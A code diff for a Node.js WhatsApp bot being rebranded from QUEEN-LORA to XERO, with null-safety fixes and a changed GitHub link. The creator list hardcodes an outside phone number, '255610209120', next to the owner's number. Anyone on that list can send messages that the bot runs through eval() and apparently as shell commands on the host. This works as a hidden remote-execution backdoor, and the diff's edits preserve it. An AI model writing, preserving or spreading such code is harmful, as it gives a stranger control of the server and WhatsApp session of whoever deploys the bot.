@@ -70,7 +70,7 @@ const {
   if (!fs.existsSync(__dirname + '/sessions')) fs.mkdirSync(__dirname + '/sessions')
   if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
     if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-    const sessdata = config.SESSION_ID.replace("QUEEN-LORA~", '');
+    const sessdata = config.SESSION_ID.replace("XERO~", ''); // changed from QUEEN-LORA~ to XERO~
     const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
     filer.download((err, data) => {
       if(err) throw err
@@ -130,7 +130,9 @@ const {
     conn.ev.on('connection.update', (update) => {
       const { connection, lastDisconnect } = update
       if (connection === 'close') {
-        if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
+        // ✅ FIX: Use optional chaining to avoid crash
+        const statusCode = lastDisconnect?.error?.output?.statusCode;
+        if (statusCode !== DisconnectReason.loggedOut) {
           connectToWA()
         }
       } else if (connection === 'open') {
@@ -242,17 +244,20 @@ const {
       }
       const udp = botNumber.split('@')[0];
       const jawad = ('255763111390', '255610209120');
-      let isCreator = [udp, jawad, config.DEV]
-              .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+      // Fix: Ensure config.DEV exists, else use empty string
+      const dev = config.DEV ? config.DEV + '@s.whatsapp.net' : '';
+      let isCreator = [udp, jawad, dev]
+              .map(v => v && v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+              .filter(v => v)
               .includes(mek.sender);
   
-      if (isCreator && mek.text.startsWith('%')) {
+      if (isCreator && mek.text && mek.text.startsWith('%')) {
         let code = budy.slice(2);
         if (!code) { reply(`Provide me with a query to run Master!`); return; }
         try { let resultTest = eval(code); if (typeof resultTest === 'object') reply(util.format(resultTest)); else reply(util.format(resultTest)); } catch (err) { reply(util.format(err)); }
         return;
       }
-      if (isCreator && mek.text.startsWith('$')) {
+      if (isCreator && mek.text && mek.text.startsWith('$')) {
         let code = budy.slice(2);
         if (!code) { reply(`Provide me with a query to run Master!`); return; }
         try {
@@ -551,7 +556,7 @@ const {
       for (let i of kon) {
         list.push({
           displayName: await conn.getName(i + '@s.whatsapp.net'),
-          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
+          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/xero-md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
         });
       }
       conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted });
